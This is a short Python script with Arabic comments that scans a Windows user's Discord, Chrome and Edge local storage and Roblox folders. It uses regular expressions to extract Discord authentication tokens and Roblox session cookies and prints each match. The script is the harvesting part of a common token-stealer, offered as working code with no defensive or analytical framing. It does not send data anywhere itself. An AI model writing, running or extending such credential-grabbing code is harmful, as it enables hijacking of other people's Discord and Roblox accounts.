import os
import re
import sys

def get_target_paths():
    user_profile = os.environ.get("USERPROFILE", "")
    return {
        "Discord": os.path.join(user_profile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
        "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        "Roblox App": os.path.join(user_profile, "AppData", "Local", "Roblox")
    }

def scan_and_print():
    paths = get_target_paths()
    print("[*] بدء الفحص السريع والطباعة الفورية...\n" + "="*50)
    
    # تعبيرات منتظمة دقيقة للتوكنات وكوكيز روبلوكس
    discord_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{58}")
    roblox_regex = re.compile(r"(_|WARNING:-DO-NOT-SHARE-THIS--)[a-zA-Z0-9_\-\+]+")

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
            
        print(f"\n[+] جاري فحص مسار: {name}")
        
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith((".ldb", ".log", ".txt", ".json", ".sqlite")):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "r", errors="ignore") as f:
                            content = f.read()
                            
                            # البحث عن توكنات ديسكورد
                            if "Discord" in name or "Chrome" in name or "Edge" in name:
                                matches = discord_regex.findall(content)
                                for match in matches:
                                    print(f" > [Discord Token Found]: {match}")
                                    sys.stdout.flush()
                                    
                            # البحث عن كوكيز روبلوكس
                            if "Roblox" in name:
                                r_matches = roblox_regex.findall(content)
                                for match in r_matches:
                                    print(f" > [Roblox Cookie Found]: {match}")
                                    sys.stdout.flush()
                    except Exception:
                        pass

    print("\n" + "="*50 + "\n[*] انتهى الفحص.")

if __name__ == "__main__":
    scan_and_print()
